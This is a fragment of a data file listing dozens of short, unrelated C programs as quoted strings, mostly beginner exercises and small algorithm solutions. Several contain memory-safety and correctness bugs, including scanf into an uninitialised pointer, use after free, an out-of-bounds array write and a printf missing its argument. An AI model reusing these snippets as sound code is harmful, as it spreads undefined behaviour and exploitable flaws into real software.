    "#include <float.h>\n#include <limits.h>\n#include <math.h>\n#include <stdbool.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main(int argc, char* argv[]) {\n    int firstNum = 0;\n    int* numArr = ((void*)0);\n    int lowIndex = 0;\n    int tempHolder = 0;\n    FILE* fileHandle = fopen(\"Data1.txt\", \"r\");\n    {\n        fscanf(fileHandle, \"%d\", &firstNum);\n        numArr = (int*)(malloc(sizeof(int) * firstNum));\n        for (int i = 0; i < firstNum; i++) {\n            fscanf(fileHandle, \"%d\", &numArr[i]);\n        }\n    }\n    fclose(fileHandle);\n    printf(\"\\n\");\n    for (int i = 0; i < firstNum; i++) {\n        lowIndex = numArr[i];\n        for (int j = i + 1; j < firstNum; j++) {\n            if (lowIndex > numArr[j]) {\n                tempHolder = lowIndex;\n                lowIndex = numArr[j];\n                numArr[j] = tempHolder;\n            }\n        }\n        numArr[i] = lowIndex;\n        printf(\"%d \", numArr[i]);\n    }\n    printf(\"\\n\");\n    return 0;\n}",
    "int main(void)\n{\n int x=2;\n int i=1;\n while(x<10) {\n    if(i%2==0) x++;\n    i++;\n }\n return 0;\n}",
    "#include<stdio.h>\nint exchange[55];\nint temp[2][55];\nvoid init(){\n    int i;\n    for(i=1;i<=54;i++){\n        temp[0][i]=i;\n        temp[1][i]=0;\n    }\n    return;\n}\nvoid repeat(int n){\n    int i;\n    for(i=1;i<=54;i++){\n        temp[n%2][exchange[i]]=temp[(n+1)%2][i];\n    }\n    return;\n}\nvoid print(int n){\n    int i;\n    int num,c,d;\n    char ch[5]=\"SHCDJ\";\n    for(i=1;i<=54;i++){\n        num=temp[n%2][i];\n        c=(num-1)/13;\n        d=num-13*c;\n        printf(\"%c%d\",ch[c],d);\n        if(i<54){\n            printf(\" \");\n        }else{\n            printf(\"\\n\");\n        }\n    }\n    return;\n}\nint main(){\n    int N,i;\n    init();\n    scanf(\"%d\",&N);\n    for(i=1;i<=54;i++){\n        scanf(\"%d\",&exchange[i]);\n    }\n    for(i=1;i<=N;++i){\n        repeat(i);\n    }\n    print(N);\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    printf(\"Welcome to the Apple Security Research Device\\n\");\n    return 0;\n}",
    "#include<stdio.h>\n#include<string.h>\nchar toLower(char a)\n{\nreturn(a-'A'+'a');\n}\nint palindrome(char* str)\n{\nint i =0;\nint j =strlen(str);\nchar a,b;\nfor(i=0;i<j;)\n{\n  if((str[i] <='Z' && str[i] >='A') || (str[i] >='a' && str[i] <='z'))\n  {\n     if((str[j] <='Z' && str[j] >='A') || (str[j] >='a' && str[j] <='z'))\n     {\n          if(str[i] <='Z' && str[i] >='A')\n             a = toLower(str[i]);\n          else\n             a = str[i];\n          if(str[j] <='Z' && str[j] >='A')\n              b = toLower(str[j]);\n          else\n              b = str[j];\n          if(a!=b)\n            return 0;\n       i++;\n       j--;\n     }\n     else\n     {\n         j--;\n     }\n  }\n  else\n  {\n     i++;\n  }\n}\nreturn 1;\n}\nint main()\n{\nchar *s;\nscanf(\"%s\",s);\nif(palindrome(s))\n  printf(\"Is a Palindrome\\n\");\nelse\n  printf(\"Is not a palindrome\\n\");\nreturn 0;\n}",
    "#include<stdio.h>\nint main()\n{\n puts(\"All three digit narcissistic number are:\");\n for(int i=100;i<=999;i++)\n {\n  int tot=0,tmp=i;\n  for(int j=1;j<=3;j++)\n  {\n   int u=tmp%10;\n   tot+=u*u*u;\n   tmp/=10;\n  }\n  if(tot==i)printf(\"%d\\n\",i);\n }\n}",
    "#include <stdio.h>\nint main(void) {\n  double c;\n  scanf(\"%lf\", &c);\n  printf(\"%.1lf\", c * 9.0 / 5.0 + 32.0);\n}",
    "#include<stdio.h>\nint main()\n{\n    FILE * myfile = fopen(\"test2.c\",\"r\");\n    if(myfile==((void*)0))\n    return -1;\n    char c=fgetc(myfile);\n    while(c!=(-1))\n    {\n        putchar(c);\n        c=fgetc(myfile);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <unistd.h>\nvoid task1(){\n    int i=0;\n    while(1){\n        printf(\"task1 - %d\\n\", i);\n        i++;\n        sleep(5);\n    }\n}\nvoid task2(){\n    int i=0;\n    while(1){\n        printf(\"task2 - %d\\n\", i);\n        i++;\n        sleep(4);\n    }\n}\nint main(int argc, char *argv[])\n{\n#pragma omp parallel\n    {\n#pragma omp single\n        {\n            printf(\"A \");\n#pragma omp task\n            {\n                task2();\n            }\n#pragma omp task\n            {\n                task1();\n            }\n#pragma omp taskwait\n            printf(\"is fun to watch \");\n        }\n    }\n    printf(\"\\n\");\n    return(0);\n}",
    "#include <stdio.h>\n#include <string.h>\nint main(int argc, char const *argv[]) {\n  const char *QUIT_SIGNAL = \"quit\";\n  char str[5];\n  double x;\n  double y;\n  double z;\n  do {\n    printf(\"\u8a08\u7b97\u306e\u7a2e\u985e\u3092\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044(\u5165\u529b:+-*/ quit):\");\n    scanf(\"%s\", str);\n    if (0 == strcmp(str, QUIT_SIGNAL)) {\n      break;\n    }\n    printf(\"\u6570\u5024\u3092\uff11\u3064\u5165\u529b\u304f\u3060\u3055\u3044:\");\n    scanf(\"%lf\", &x);\n    printf(\"\u6570\u5024\u3092\u3082\u3046\uff11\u3064\u5165\u529b\u304f\u3060\u3055\u3044:\");\n    scanf(\"%lf\", &y);\n    switch (str[0]) {\n    case '+':\n      z = x + y;\n      break;\n    case '-':\n      z = x - y;\n      break;\n    case '*':\n      z = x * y;\n      break;\n    case '/':\n      z = x / y;\n      break;\n    }\n    printf(\"\u8a08\u7b97\u7d50\u679c:%f\\n\", z);\n  } while (1);\n  return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    char ch;\n    printf(\"Do you wish to continue? (Y/N): \");\n    ch = getchar();\n    if (ch == 'Y') {\n        printf(\"Proceed\\n\");\n    }\n}",
    "#include <stdio.h>\n#include <math.h>\nint N = 10001;\nint main () {\n    int p[N];\n    p[0] = 2;\n    int i = 1;\n    int n = 3;\n    while (i < N) {\n        int isprime = 1;\n        for (int k = 0; k < i; k++) {\n            if (p[k] > sqrt(n)) {\n                break;\n            }\n            if (n % p[k] == 0) {\n                isprime = 0;\n            }\n        }\n        if (isprime == 1) {\n            p[i] = n;\n            i++;\n        }\n        n += 2;\n    }\n    printf(\"%d\\n\", p[i - 1]);\n    return 0;\n}",
    "#include\"stdio.h\"\nint main()\n{\n int xy=10;\n int x=10;\n printf(\"%d\",x);\n return 0;\n}",
    "#include<stdio.h>\n\nint main()\n{\n    int a, b, n, k, max_and =0, max_or = 0, max_xor = 0;\n    scanf(\"%d%d\", &n, &k);\n    for(b=2; b<=n; b++)\n        for(a=1; a<b; a++)\n        {\n            max_and = ((a&b)<k) ? (((a&b) > (max_and)) ? (a&b) : (max_and)):max_and;\n            max_or = ((a|b)<k) ? (((a|b) > (max_or)) ? (a|b) : (max_or)):max_or;\n            max_xor = ((a^b)<k) ? (((a^b) > (max_xor)) ? (a^b) : (max_xor)):max_xor;\n        }\n    printf(\"%d\\n%d\\n%d\\n\", max_and, max_or, max_xor);\n    return 0;\n}",
    "#include  <stdio.h>\nint main() {\n  int M, n;\n  long int x, y = 1;\n  scanf(\"%i %i\", &M, &n);\n  if(n == 0)\n    printf(\"1\");\n  else {\n    x = M;\n    while(n > 1) {\n      if(n%2 == 1) {\n        n -= 1;\n        y *= x;\n      }\n      n /= 2;\n      x *= x;\n    }\n    printf(\"%li\", x*y);\n  }\n  return 0;\n}",
    "int main()\n{\n int pera = 3;\n char qualidade = 'A';\n float peso = 0.653;\n return 0;\n}",
    "#include <stdio.h>\ndouble factorial(int n)\n{\n    static double product;\n    if(n > 1)\n    {\n        product = n*factorial(n-1);\n        return product;\n    }\n    else\n        return 1;\n}\ndouble power(int number, int exponent)\n{\n    static double product;\n    if(exponent > 0)\n    {\n        product = number * power(number, exponent-1);\n        return product;\n    }\n    else\n        return 1;\n}\ndouble taylorSeries(int x, int n)\n{\n    double sum;\n    if(n > 0)\n    {\n        sum = (power(x,n-1)/factorial(n-1)) + taylorSeries(x, n-1);\n       return sum;\n    }\n    else\n        return 0;\n}\ndouble HornersRule_Recursive(float x, int n)\n{\n    static double sum = 1;\n    if(n > 0)\n    {\n        sum = 1 + x/n * sum;\n        return HornersRule_Recursive(x, n-1);\n    }\n    else return sum;\n}\ndouble HornersRule_Iterative(float x, int n)\n{\n    double sum = 1;\n    int i;\n    for(; n > 0; n--)\n    {\n        sum = 1 + x/n * sum;\n    }\n    return sum;\n}\nint main()\n{\n    int x = 1;\n    int n = 10;\n    printf(\"\\nRecursion:\\t%lf\", taylorSeries(x, n));\n    printf(\"\\nHorner's:\\t%lf\", HornersRule_Recursive(x, n));\n    printf(\"\\nHorner's Iterative:\\t%lf\", HornersRule_Iterative(x, n));\n    return 0;\n}",
    "#include <stdio.h>\nvoid stringcat(char *dest, char *source);\nvoid stringcat(char *dest, char *source)\n{\n  while (*dest++)\n    ;\n  dest--;\n  while ((*dest++ = *source++))\n    ;\n}\nint main(void)\n{\n  char dest[23] = {'h', 'l', '\\0'};\n  char *source = \"hello world\";\n  stringcat(dest, source);\n  printf(\"%s\\n\", dest);\n}",
    "#include <stdio.h>\nint main()\n{\n int m,n,i,j,a[20][20];\n printf(\"Enter the order: \");\n scanf(\"%d%d\",&m,&n);\n for(i=0;i<m;i++)\n {\n  for(j=0;j<n;j++)\n   scanf(\"%d\", &a[i][j]);\n }\n for(j=0;j<n;j++)\n {\n  for(i=0;i<m;i++)\n   printf(\"%d \", a[i][j]);\n  printf(\"\\n\");\n }\n return 0;\n}",
    "#include <stdio.h>\n\nvoid moveToEnd(int mPlusN[], int size)\n{\n  int i = 0, j = size - 1;\n  for (i = size-1; i >= 0; i--)\n    if (mPlusN[i] != -1)\n    {\n      mPlusN[j] = mPlusN[i];\n      j--;\n    }\n}\nint merge(int mPlusN[], int N[], int m, int n)\n{\n  int i = n;\n  int j = 0;\n  int k = 0;\n  while (k < (m+n))\n  {\n    if ((i < (m+n) && mPlusN[i] <= N[j]) || (j == n))\n    {\n      mPlusN[k] = mPlusN[i];\n      k++;\n      i++;\n    }\n    else\n    {\n      mPlusN[k] = N[j];\n      k++;\n      j++;\n    }\n  }\n}\nvoid printArray(int arr[], int size)\n{\n  int i;\n  for (i=0; i < size; i++)\n    printf(\"%d \", arr[i]);\n  printf(\"\\n\");\n}\nint main()\n{\n  int mPlusN[] = {2, 8, -1, -1, -1, 13, -1, 15, 20};\n  int N[] = {5, 7, 9, 25};\n  int n = sizeof(N)/sizeof(N[0]);\n  int m = sizeof(mPlusN)/sizeof(mPlusN[0]) - n;\n  moveToEnd(mPlusN, m+n);\n  merge(mPlusN, N, m, n);\n  printArray(mPlusN, m+n);\n  return 0;\n}",
    "#include<stdio.h>\nint a[100005];\nint b[105][105];\nint n,i,j,k,x,ans,m;\nint main(int argc, char *argv[])\n{\nint hi ;\nans = 40000000;\nint n;\nscanf(\"%d%d\",&n,&m);\nfor(i=1;i<=n;i++)\nscanf(\"%d\",&a[i]);\nint x,y;\nfor(i=0;i<m;i++)\n{\nscanf(\"%d%d\",&x,&y);\nb[y][x] = b[x][y] = 1;\n}\nhi = ans;\nfor(i=1;i<=n;i++)\nfor(j=i+1;j<=n;j++)\nfor(k=j+1;k<=n;k++)\n{\nif(b[i][j] && b[j][k] && b[k][i]){\nx = a[i] + a[j] + a[k];\nif(x<ans)ans = x;}\n}\nif(ans==hi)ans = -1;\nprintf(\"%d\\n\",ans);\nreturn 0;\n}",
    "void f(int a[]) {\n a[7] = 0;\n a[3] = 1;\n}\nint main(int argc, char *argv[]) {\n int a[10];\n int i, c;\n f(a);\n c = 1 / a[7];\n return c;\n}",
    "#include<stdio.h>\nvoid swap(int* a, int* b)\n{\n    int t = *a;\n    *a = *b;\n    *b = t;\n}\nint partition (int arr[], int low, int high)\n{\n    int pivot = arr[high];\n    int i = (low - 1);\n    for (int j = low; j <= high- 1; j++)\n    {\n        if (arr[j] <= pivot)\n        {\n            i++;\n            swap(&arr[i], &arr[j]);\n        }\n    }\n    swap(&arr[i + 1], &arr[high]);\n    return (i + 1);\n}\nvoid quickSort(int arr[], int low, int high)\n{\n    if (low < high)\n    {\n        int pi = partition(arr, low, high);\n        quickSort(arr, low, pi - 1);\n        quickSort(arr, pi + 1, high);\n    }\n}\nvoid result(int a[],int n,int m)\n{\n    int i;\n    quickSort(a,0,n-1);\n    printf(\"The %d smallest one numbers are\\n\");\n    for(i=0;i<m;i++)\n    {\n        printf(\"%d \",a[i]);\n    }\n}\nint main()\n{\n    int n,i,m;\n    printf(\"how many numbers do you want to take? \\n\");\n    scanf(\"%d\",&n);\n    int a[n];\n    printf(\"Enter the elements\\n\");\n    for(i=0;i<n;i++)\n    {\n       scanf(\"%d\",&a[i]);\n    }\n    printf(\"how many minimum numbers do you want to take?\\n\");\n    scanf(\"%d\",&m);\n    result(a,n,m);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int n,a,b,c,d,a3,b3,c3,d3;\n    printf(\"Enter the limit: \");\n    scanf(\"%d\",&n);\n    for(a=1;a<=n;a++)\n    {\n        a3=a*a*a;\n        if(a3>n)\n            break;\n        for(b=a;b<=n;b++)\n        {\n            b3=b*b*b;\n            if(a3+b3>n)\n                break;\n            for(c=a+1;c<=n;c++)\n            {\n                c3=c*c*c;\n                if(c3>a3+b3)\n                    break;\n                for(d=c;d<=n;d++)\n                {\n                    d3=d*d*d;\n                    if(c3+d3>a3+b3)\n                        break;\n                    if(c3+d3==a3+b3)\n                        printf(\"%d=%d^3+%d^3=%d^3+%d^3\\n\",(a3+b3),a,b,c,d);\n                }\n            }\n        }\n    }\n    return 0;\n}",
    "#include <stdio.h>\nunsigned long factorial(unsigned long n);\nunsigned long factorial(unsigned long n)\n{\n    unsigned long rv;\n    if(n == 1)\n    {\n        rv = 1;\n    }\n    else\n    {\n        rv = n * factorial(n-1);\n    }\n    return rv;\n}\nint main(void)\n{\n    unsigned long n;\n    printf(\"Enter n: \");\n    scanf(\"%lu\", &n);\n    printf(\"n! = %lu\\n\", factorial(n));\n}",
    "#include <stdio.h>\n\n\nint get_line(char line[], int maxline);\nint main()\n{\n int len;\n char line[1000];\n while ((len = get_line(line, 1000)) > 0) {\n if(len > 80)\n  printf(\"%s\",line);\n }\n return 0;\n}\nint get_line(char s[], int lim)\n{\n int c, i;\n for(i = 0; i < lim - 1 && (c = getc((stdin))) != (-1) && c != '\\n'; ++i)\n  s[i] = c;\n if (c == '\\n') {\n  s[i] = c;\n  ++i;\n }\n s[i] = '\\0';\n return i;\n}",
    "#include <stdio.h>\nint factorial(int);\nint main(void) {\n  int n, facto;\n  printf(\"Please enter a positive integer: \");\n  scanf(\"%d\", &n);\n  if (n < 0) {\n    printf(\"%d is negative! Aborting..\\n\", n);\n  } else {\n    facto = factorial(n);\n    printf(\"%d! = %d.\\n\", n, facto);\n  }\n  return 0;\n}\nint factorial(int n) {\n  int result;\n  if (n == 0) {\n    result = 1;\n  } else {\n    result = n * factorial(n - 1);\n  }\n  return result;\n}",
    "#include <stdio.h>\n#include <string.h>\nint main(int argc, char const *argv[])\n{\n    char *string = \"string\";\n    int i;\n    int length = strlen(string);\n    for(i = 0; i <length; i++)\n    {\n        putchar(*(string+i));\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int n = 0;\n    int p = 1;\n    int c = 3;\n    scanf(\"%d\", &n);\n    int result1 = (n >> p) & 1;\n    int result2 = (n >> c) & 1;\n    printf(\"Bit at position 1:%d\\n\", result1);\n    printf(\"Bit at position 3:%d\\n\", result2);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n\nvoid ParseCommand(char *command, int *argc, char *argv[]);\nint main(){\n char command[2048];\n command[0]=command[2048 -1]=0;\n int argc = 0;\n char *argv[256] = { ((void*)0) };\n while(1){\n  printf(\"$ \");\n  fgets(command, 2048 - 1, (stdin));\n  command[strlen(command)-1] = 0;\n  if(strcmp(command, \"quit\") == 0 || strcmp(command, \"exit\") == 0) break;\n  ParseCommand(command, &argc, argv);\n  printf(\"argc = %d\\n\", argc);\n  for(int i = 0; i < argc; i++)\n    printf(\"argv[%d] = %s\\n\", i, argv[i]);\n  printf(\"argv[%d] = %p\\n\", argc, argv[argc]);\n }\n printf(\"Bye!\\n\");\n  return 0;\n}\nvoid ParseCommand(char *command, int *argc, char *argv[])\n{\n int i,j = 0, count = 0, ending = strlen(command);\n char *start, *pos = ((void*)0);\n (*argc) = 0;\n start = pos = command;\n for( i ;(*start) == 32;i++)\n  pos=++start;\n for( j = i ; j < ending ;j++)\n {\n  if((*pos == 32) && (count == 0)){\n   *pos = 0;\n   if(*(++pos) != 32)\n   {\n    argv[*argc] = start;\n    start = pos;\n    (*argc)++;\n    if((*pos == 34)|| (*pos == 39))\n    {\n     (*start) = 0;\n     start++;\n     count=1;\n    }\n   }\n     }\n  else if(count==1)\n  {\n   ++pos;\n   if((*pos == 34)|| (*pos == 39))\n   {\n    (*pos) = count = 0;\n   }\n  }\n  else\n  {\n   pos++;\n   if(j == ending-1){\n           argv[*argc] = start;\n     (*argc)++;\n   }\n  }\n }\n argv[*argc]= start = pos = ((void*)0);\n}",
    "#include <stdio.h>\n\nint main()\n{\n    int x,y,z;\n    double p,q,r;\n        scanf (\"%i\", &x);\n        scanf (\"%i\", &y);\n        scanf (\"%i\", &z);\n        scanf (\"%lf\", &p);\n        scanf (\"%lf\", &q);\n        scanf (\"%lf\", &r);\n        getchar();\n        printf(\"After the permutation:\\n\");\n        {int temp;temp=(y) ; (y)=(x) ; (x)=(z); (z)=temp;};\n        printf(\"%d\\n%d\\n%d\\n\", x, y, z);\n        {double temp;temp=(q) ; (q)=(p) ; (p)=(r); (r)=temp;};\n        printf(\"%.5lf\\n%.5lf\\n%.5lf\\n\", p, q, r);\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n    int input;\n    while ((-1) != (input = getchar())) {\n        putchar(input);\n    }\n    printf(\"\\n%d\\n\", getchar() != (-1));\n    printf(\"\\n%d\\n\", (-1));\n}",
    "#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\nint main(void)\n{\n   printf(\"%u\\n\", geteuid());\n   return 0;\n}",
    "void printf();\nint f(int n) {\n  printf(\"%d\\n\", n);\n  return n > 10;\n}\nint main() {\n  printf(\"%d\\n\", f(3) || f(15));\n  printf(\"%d\\n\", f(2) || f(4));\n  printf(\"%d\\n\", f(14) || f(6));\n  printf(\"%d\\n\", f(15) || f(17));\n  printf(\"%d\\n\", f(3) && f(15));\n  printf(\"%d\\n\", f(2) && f(4));\n  printf(\"%d\\n\", f(14) && f(6));\n  printf(\"%d\\n\", f(15) && f(17));\n  printf(\"%d\\n\", 0 || 0 || 1);\n  printf(\"%d\\n\", !0);\n  printf(\"%d\\n\", !1);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint ordenacao(int N, int* idades);\nint main() {\n    int N, i, result;\n    int *idades;\n    scanf(\" %d\", &N);\n    idades = (int*) malloc (N * sizeof(int));\n    for ( i = 0; i < N; i++) {\n        scanf(\" %d\", &idades[i]);\n    }\n    idades[N] = '\\0';\n    result = ordenacao(N,idades);\n    printf(\"%d\", result);\n    free(idades);\n    return 0;\n}\nint ordenacao(int N, int* idades){\n    int errados=0;\n    int i;\n    for ( i = N-1; i >= 1; i--){\n        if (idades[i-1] > idades[i]){\n            errados++;\n        }\n    }\n    return errados;\n}",
    "#include <stdio.h>\nfloat absoluteValue(float x)\n{\n if(x < 0)\n  x = -x;\n return x;\n}\nint main(void)\n{\n float f1 = -15.5, f2 = 20.0, f3 = -5.0;\n int i1 = -716;\n float result;\n result = absoluteValue(f1);\n printf(\"result = %.2f\\n\", result);\n printf(\"f1 = %.2f\\n\", f1);\n result = absoluteValue(f2) + absoluteValue(f3);\n printf(\"result = %.2f\\n\", result);\n result = absoluteValue((float)i1);\n printf(\"result = %.2f\\n\", result);\n result = absoluteValue(i1);\n printf(\"result = %.2f\\n\", result);\n printf(\"%.2f\\n\", absoluteValue(-6.0) / 4);\n return 0;\n}",
    "#include <stdio.h>\nint main(){\n int a = 1;\n double sum = 0;\n while(a < 1000000){\n  if( (a+1)/2 %2 == 1){\n   sum += 1/(double)a;\n  }\n  else{\n   sum -= 1/(double)a;\n  }\n  a += 2;\n }\n printf(\"%.6f\",sum);\n return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nunsigned long long int calcProduct(int startIndex, int endIndex, char digitArr[]);\nint main(void) {\n char digitArr[] = \"7316717653133062491922511967442657474235534919493496983520312774506326239578318016984801869478851843858615607891129494954595017379583319528532088055111254069874715852386305071569329096329522744304355766896648950445244523161731856403098711121722383113622298934233803081353362766142828064444866452387493035890729629049156044077239071381051585930796086670172427121883998797908792274921901699720888093776657273330010533678812202354218097512545405947522435258490771167055601360483958644670632441572215539753697817977846174064955149290862569321978468622482839722413756570560574902614079729686524145351004748216637048440319989000889524345065854122758866688116427171479924442928230863465674813919123162824586178664583591245665294765456828489128831426076900422421902267105562632111110937054421750694165896040807198403850962455444362981230987879927244284909188845801561660979191338754992005240636899125607176060588611646710940507754100225698315520005593572972571636269561882670428252483600823257530420752963450\";\n int digitArrLen = strlen(digitArr);\n int startIndex = 0;\n int endIndex = 13;\n unsigned long long int largestProduct = calcProduct(startIndex, endIndex, digitArr);\n while (endIndex < digitArrLen) {\n  unsigned long long int tempProduct = calcProduct(startIndex, endIndex, digitArr);\n  if (tempProduct > largestProduct)\n   largestProduct = tempProduct;\n  startIndex++;\n  endIndex++;\n }\n printf(\"The largest 13 digit product is %llu\\n\", largestProduct);\n return 0;\n}\nunsigned long long int calcProduct(int startIndex, int endIndex, char digitArr[]) {\n unsigned long long int product = digitArr[startIndex] - '0';\n for (int i = startIndex+1; i < endIndex; i++) {\n  if (digitArr[i] - '0' == 0)\n   return 0;\n  product *= digitArr[i] - '0';\n }\n return product;\n}",
    "\nint main(int argc, char **argv) {\n  int a;\n  double __attribute__((unit(m))) x = 0;\n  a = x == x;\n  a = x != x;\n  a = x > x;\n  a = x >= x;\n  a = x < x;\n  a = x <= x;\n  a = x == 0;\n  a = x != 0;\n  a = x > 0;\n  a = x >= 0;\n  a = x < 0;\n  a = x <= 0;\n  a = 0 == x;\n  a = 0 != x;\n  a = 0 > x;\n  a = 0 >= x;\n  a = 0 < x;\n  a = 0 <= x;\n  a = 0 == 0;\n  a = 0 != 0;\n  a = 0 > 0;\n  a = 0 >= 0;\n  a = 0 < 0;\n  a = 0 <= 0;\n  a = !x;\n  return 0;\n}",
    "int g1 = 10;\nvoid foo() {\ntest: g1++;\n}\nvoid bar(int x) {\n int y = 10;\n if (x < 10) {\n  bar(x++);\n }\n}\nvoid foobar(int x) {\n x = 10;\n int yz = 11;\n}\nint main() {\n int x = 10;\n int z = 11;\n#pragma omp parallel\n {\n#pragma omp atomic update\n  z = 0;\n#pragma omp barrier\n  if (x < 9) {\n#pragma omp atomic update\n   z++;\n#pragma omp barrier\n  } else {\n#pragma omp barrier\n#pragma omp atomic update\n   z++;\n  }\n }\n z = 11;\n#pragma omp parallel\n {\n#pragma omp atomic update\n  z++;\n#pragma omp barrier\n#pragma omp atomic update\n  x++;\n }\n int thisVar = 14;\ntest: x++;\n   while (x > 8) {\nl2: x--;\n if (x == 1) {\nthisStmt: x = 3 + x++ + thisVar;\n    foo();\n    int z = 10;\nl1: x = 10;\n bar(z);\n }\n bar(10);\n   }\n   do {\n    x--;\n    x = x + 2;\n    x = x - g1;\n    thisVar++;\n   } while (x > 0);\n   while (thisVar++ < 5) {\n    if (thisVar == 10) {\n     continue;\n    }\n   }\n}",
    "#include <stdio.h>\nunsigned int fibonacci (unsigned int n)\n{\n asm(\"nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop\");\n if (n==1)\n {\n  return 1u;\n }\n else if (n==2)\n {\n                return 1u;\n }\n else\n {\n  unsigned int fib = fibonacci(n-1) + fibonacci(n-2);\n                return fib;\n }\n}\nint main(void)\n{\n fibonacci (17);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main() {\n    int number = 10;\n    int *numberP = &number;\n    printf(\"Valor da variavel number: %d\\n\",number);\n    printf(\"Endereco da variavel number: %p\\n\",&number);\n    printf(\"Valor da variavel numberP: %p\\n\",numberP);\n    printf(\"Valor apontado por numberP: %d\\n\\n\",*numberP);\n    printf(\"Mudando o valor de number de forma indireta\\n\\n\");\n    *numberP = 15;\n    printf(\"Valor da variavel number: %d\\n\",number);\n    numberP++;\n    printf(\"Valor da variavel numberP: %p\\n\", numberP);\n    printf(\"Valor no endereco apontado: %d\\n\", *numberP);\n    float *pi = (float *) malloc(sizeof(float));\n    printf(\"Valor da variavel pi: %p\\n\", pi);\n    *pi=3.1415;\n    printf(\"Valor no endereco apontado: %f\\n\", *pi);\n    free(pi);\n    printf(\"Valor da variavel pi: %p\\n\", pi);\n    printf(\"Valor da variavel apontada: %f\\n\", *pi);\n    *pi = 0;\n    pi = ((void*)0);\n    int *numbers = (int *) malloc(sizeof(int) * 3);\n    *(numbers+0) = 1;\n    *(numbers+1) = 2;\n    *(numbers+2) = 3;\n    for (int i = 0; i < 3; i++)\n        printf(\"numbers[%d] = %d\\n\",i,numbers[i]);\n    for (int i = 0; i < 3; i++)\n        printf(\"*(numbers+%d) = %d\\n\",i,*(numbers+i));\n    int *aux = numbers;\n    for (int i = 0; i < 3; i++) {\n        printf(\"aux = %d\\n\",*aux);\n        aux++;\n    }\n    return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nint main(void)\n{\n    float dist, consumo, gasto, precolt, lts;\n    printf(\"informe a distancia percorida: \");\n    scanf(\"%f\",&dist);\n    printf(\"informe a consumo: \");\n    scanf(\"%f\",&consumo);\n    printf(\"informe a preco do litro de combutivel: \");\n    scanf(\"%f\",&precolt);\n    gasto=(dist/consumo)*precolt;\n    lts=dist/consumo;\n    printf(\"maria gatara %.2f litros com um custo total de %.2f reais\",lts, gasto);\n}",
    "#include <stdio.h>\n#include <string.h>\n\n\nint read_line(char *line, char terminator, int maxlen) {\n  int c, i = 0;\n  while((c = getchar()) != terminator) {\n    if (i < maxlen) *line++ = c, i++;\n  }\n  *line = '\\0';\n  return i;\n}\nvoid print_reminders(char (*reminders)[60], size_t len) {\n  int i;\n  for(i = 0; i < len; i++) {\n    printf(\"%s\\n\", reminders++);\n  }\n}\nint main(int argc, char const *argv[]) {\n  char *prompt = \"Enter day and reminder: \";\n  char line[60];\n  char reminders[50][60];\n  size_t num_remind = 0;\n  while(1) {\n    int day;\n    if (num_remind == 50) break;\n    printf(\"%s\", prompt);\n    scanf(\"%2d\", &day);\n    if (day == 0) break;\n    read_line(line, '\\n', 60);\n    strcpy(reminders[num_remind++], line);\n  }\n  print_reminders(reminders, num_remind);\n  return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\nint main(){\n int state = 1;\n int input_state = 0;\n char* input = malloc(15);\n printf(\"Door: CLOSED\\n\");\n while(scanf(\"%s\", input) == 1){\n  if(!strcmp(input, \"button_clicked\")){\n   input_state = 0;\n  } else if(!strcmp(input, \"cycle_complete\")){\n   input_state = 1;\n  } else {\n   continue;\n  }\n  if ((state == 1) && (!input_state)){\n   state = 2;\n   printf(\"Door: OPENING\\n\");\n   continue;\n  }\n  if ((state == 2) && (!input_state)){\n   state = 6;\n   printf(\"Door: STOPPED_WHILE_OPENING\\n\");\n   continue;\n  }\n  if ((state == 3) && (!input_state)){\n   state = 4;\n   printf(\"Door: CLOSING\\n\");\n   continue;\n  }\n  if ((state == 4) && (!input_state)){\n   state = 5;\n   printf(\"Door: STOPPED_WHILE_CLOSING\\n\");\n   continue;\n  }\n  if ((state == 5) && (!input_state)){\n   state = 2;\n   printf(\"Door: OPENING\\n\");\n   continue;\n  }\n  if ((state == 6) && (!input_state)){\n   state = 4;\n   printf(\"Door: CLOSING\\n\");\n   continue;\n  }\n  if ((state == 2) && (input_state)){\n   state = 3;\n   printf(\"Door: OPEN\\n\");\n   continue;\n  }\n  if ((state == 4) && (input_state)){\n   state = 1;\n   printf(\"Door: CLOSED\\n\");\n   continue;\n  }\n }\n return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n printf(\"\\u250C\\u252C\\u2510\\n\");\n printf(\"\\u251C\\u253C\\u2524\\n\");\n printf(\"\\u2514\\u2534\\u2518\");\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int a=0;\n    while(a<5)\n    {\n        printf(\"A = %d\\n\",a);\n        ++a;\n    }\n    int day =1;\n    float money =5;\n    while(day<=30)\n    {\n        printf(\"On Day %d you may have %f /- Rupees\\n\",day,money);\n        day++;\n        money *= 2;\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n double a,b,c,tri,cir,tra,qua,ret;\n scanf(\"%lf %lf %lf\",&a,&b,&c);\n tri=(a*c)/2;\n cir=3.14159*(c*c);\n tra=(c*(a+b))/2;\n qua=b*b;\n ret=a*b;\n printf(\"TRIANGULO: %.3lf\\nCIRCULO: %0.3lf\\nTRAPEZIO: %0.3lf\\nQUADRADO: %0.3lf\\nRETANGULO: %0.3lf\\n\",tri,cir,tra,qua,ret);\n return 0;\n}",
